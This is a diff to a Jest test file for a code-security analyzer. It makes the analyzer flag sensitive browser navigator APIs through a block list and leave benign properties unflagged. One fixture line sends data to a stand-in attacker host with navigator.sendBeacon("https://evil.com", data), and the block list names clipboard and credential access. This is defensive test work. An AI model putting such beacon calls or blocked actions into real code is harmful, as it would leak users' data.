@@ -191,19 +191,63 @@ describe('CodeSecurityService - analyzer', () => {
     })
   })
 
-  describe('異常系 - navigator検出', () => {
-    it('navigator.userAgentアクセスを検出', () => {
+  describe('異常系 - navigator検出（ブロックリスト方式）', () => {
+    it.each([
+      ['sendBeacon', 'navigator.sendBeacon("https://evil.com", data)'],
+      ['geolocation', 'navigator.geolocation.getCurrentPosition(cb)'],
+      ['credentials', 'navigator.credentials.get({ publicKey: {} })'],
+      ['mediaDevices', 'navigator.mediaDevices.getUserMedia({ video: true })'],
+      ['clipboard', 'navigator.clipboard.readText()'],
+      ['serviceWorker', 'navigator.serviceWorker.register("/sw.js")'],
+    ])('navigator.%s へのアクセスを検出', (prop, code) => {
+      const signals = analyzeCodeSecurity(code)
+
+      expect(signals.hasNavigatorAccess).toBe(true)
+      expect(signals.detectedViolations).toEqual(
+        expect.arrayContaining([
+          expect.objectContaining({
+            rule: 'no-navigator-access',
+            severity: 'critical',
+            message: expect.stringContaining(`navigator.${prop}`),
+          }),
+        ])
+      )
+    })
+
+    it.each([
+      ['xr', 'const session = navigator.xr.requestSession("immersive-vr")'],
+      ['userAgent', 'const ua = navigator.userAgent'],
+      ['platform', 'const p = navigator.platform'],
+      ['language', 'const lang = navigator.language'],
+      ['hardwareConcurrency', 'const cores = navigator.hardwareConcurrency'],
+    ])('navigator.%s へのアクセスは検出しない（正当利用）', (_prop, code) => {
+      const signals = analyzeCodeSecurity(code)
+
+      expect(signals.hasNavigatorAccess).toBe(false)
+      expect(signals.detectedViolations.filter(v => v.rule === 'no-navigator-access')).toHaveLength(0)
+    })
+
+    it('typeof navigator !== "undefined" の存在チェックは検出しない', () => {
       const code = `
-        const fingerprint = {
-          userAgent: navigator.userAgent,
-          platform: navigator.platform,
+        if (typeof navigator !== "undefined") {
+          console.log("browser")
         }
       `
 
       const signals = analyzeCodeSecurity(code)
 
+      expect(signals.detectedViolations.filter(v => v.rule === 'no-navigator-access')).toHaveLength(0)
+    })
+
+    it('navigator.xxx = ... の代入は引き続き検出（改ざん防止）', () => {
+      const code = `
+        navigator.sendBeacon = function() {}
+      `
+
+      const signals = analyzeCodeSecurity(code)
+
+      expect(signals.hasGlobalVariableOverride).toBe(true)
       expect(signals.hasNavigatorAccess).toBe(true)
-      expect(signals.detectedViolations.length).toBeGreaterThan(0)
     })
   })
 
